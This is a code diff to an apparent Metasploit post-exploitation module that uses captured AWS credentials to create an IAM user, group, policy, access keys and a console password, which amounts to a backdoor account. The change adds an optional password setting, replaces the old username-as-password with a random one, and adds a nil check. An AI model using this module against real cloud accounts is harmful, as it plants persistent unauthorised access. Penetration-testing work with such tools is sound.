@@ -35,6 +35,7 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('IAM_USERNAME', [false, 'Name of the user to be created (leave empty or unset to use a random name)', '']),
+        OptString.new('IAM_PASSWORD', [false, 'Password to set for the user to be created (leave empty or unset to use a random name)', '']),
         OptString.new('IAM_GROUPNAME', [false, 'Name of the group to be created (leave empty or unset to use a random name)', '']),
         OptBool.new('CREATE_API', [true, 'Add access key ID and secret access key to account (API, CLI, and SDK access)', true]),
         OptBool.new('CREATE_CONSOLE', [true, 'Create an account with a password for accessing the AWS management console', true]),
@@ -97,7 +98,7 @@ class MetasploitModule < Msf::Post
     results['GroupName'] = groupname
 
     # create group policy
-    print_status("Creating group policy: #{policyname}")
+    print_status("Creating group policy")
     pol_doc = datastore['IAM_GROUP_POL']
     action = 'PutGroupPolicy'
     doc = call_iam(creds, 'Action' => action, 'GroupName' => groupname, 'PolicyName' => 'Policy', 'PolicyDocument' => URI.encode(pol_doc))
@@ -124,7 +125,7 @@ class MetasploitModule < Msf::Post
 
     if datastore['CREATE_CONSOLE']
       print_status("Creating password for #{username}")
-      password = username
+      password = datastore['IAM_PASSWORD'].blank? ? Rex::Text.rand_text_alphanumeric(16) : datastore['IAM_PASSWORD']
       action = 'CreateLoginProfile'
       response = call_iam(creds, 'Action' => action, 'UserName' => username, 'Password' => password)
       doc = print_results(response, action)
@@ -134,8 +135,9 @@ class MetasploitModule < Msf::Post
     action = 'GetUser'
     response = call_iam(creds, 'Action' => action, 'UserName' => username)
     doc = print_results(response, action)
+    return if doc.nil?
     arn = doc['Arn']
-    results['AccountId'] = arn[/^arn:aws:iam::(\d+):/,1]
+    results['AccountId'] = arn[/^arn:aws:iam::(\d+):/, 1]
 
     keys = results.keys
     table = Rex::Text::Table.new(
